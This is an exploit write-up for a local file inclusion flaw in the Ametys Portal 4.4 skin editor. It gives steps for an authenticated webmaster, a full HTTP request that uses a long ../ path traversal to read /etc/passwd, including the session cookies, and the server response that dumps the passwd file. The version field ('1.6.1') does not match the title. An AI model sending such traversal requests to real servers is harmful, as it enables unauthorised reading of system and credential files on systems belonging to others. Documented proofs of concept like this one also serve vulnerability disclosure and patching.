## Exploit Title: Ametys Portal 4.4 - Local File Inclusion

- **Date:** 05.08.2025
- **Exploit Author:** tmrswrr
- **Vendor Homepage:** [Ametys Portal](https://www.ametys.org)
- **Software Link:** [Ametys Portal 4.4](https://www.ametys.org/community/en/download/ametys-portal/ametys-portal-4.html)
- **Version:** 1.6.1

![Ametys Portal 4.4](https://raw.githubusercontent.com/capture0x/Ametys-LFI/refs/heads/main/ametys.png)

### POC:

# Exploit working with manager , webmaster and admin cred 
1. Login with webmaster cred 
2. Click Skin Editor > Resources > Img > any image file 
3. Catch to request with burp suite , change path with lfi payload 

### Request:

```http
GET /cms/plugins/skineditor/file/download?path=../../../../../../../../../../../../../../../../etc/passwd&skinName=demo HTTP/1.1
Host: demo.ametys.org
Cookie: JSESSIONID=3F87581AEF2EC304640A09D7094D98EE; AmetysAuthentication=YW1ldHlzX2RlbW9fdXNlcnMjd2VibWFzdGVyI05ycnY0RlVPeXgwcENOVEk; tarteaucitron=!gajs=false!matomocloud=false!googlemaps=false!gagenda=false!sharethis=false!dailymotion=false!youtube=false!youtubeplaylist=false; JSESSIONID=DC788DBC176BFB0787DA25FC2C93CE63; _pk_id.2.afd3=4f757134bce0bed6.1754326045.; _ga_2VTM1RYFX8=GS2.1.s1754331048$o1$g1$t1754331054$j54$l0$h0; JSESSIONID-Ametys=719D9B1BA49FE4046DFB966F28FBB385
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://demo.ametys.org/cms/www/index.html
Dnt: 1
Sec-Gpc: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
### Response:

```
HTTP/1.1 200 
Date: Tue, 05 Aug 2025 11:54:47 GMT
Server: Apache
Content-Security-Policy: default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'; img-src 'self' https: data: blob: 'unsafe-inline' 'unsafe-eval'; frame-src 'self' https: data: ms-word: ms-powerpoint: ms-excel: ms-visio: ms-access: ms-project: ms-publisher: ms-infopath: vnd.libreoffice.command: ; frame-ancestors 'self' http: https: ; connect-src 'self' https: data: 'unsafe-inline' 'unsafe-eval' wss:
Referrer-Policy: strict-origin-when-cross-origin
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Permissions-Policy: accelerometer=(), autoplay=*, battery=(), camera=(), cross-origin-isolated=(), display-capture=(), document-domain=(), encrypted-media=(), execution-while-not-rendered=(), execution-while-out-of-viewport=(), fullscreen=*, geolocation=(), gyroscope=(), magnetometer=(), microphone=(), midi=(), navigation-override=(), payment=(), picture-in-picture=(), publickey-credentials-get=(), screen-wake-lock=(), usb=(), web-share=(), xr-spatial-tracking=()
X-Cocoon-Version: 2.1.13
Content-Disposition: attachment; filename="passwd"
Content-Length: 2247
Cache-Control: max-age=1
Expires: Tue, 05 Aug 2025 11:54:48 GMT
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Language: fr

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sssd:x:112:119:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
tomcat:x:997:997:Apache Tomcat:/:/usr/sbin/nologin
cms:x:1001:1000::/home/cms:/bin/bash
postfix:x:113:121::/var/spool/postfix:/usr/sbin/nologin
glouton:x:996:998:Glouton daemon:/var/lib/glouton:/sbin/nologin
_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
fwupd-refresh:x:115:123:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dhcpcd:x:117:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:995:995:User for polkitd:/:/usr/sbin/nologin

```

### Video

![Ametys Poc Video](https://github.com/capture0x/Ametys-LFI/raw/refs/heads/main/ametys.mp4)
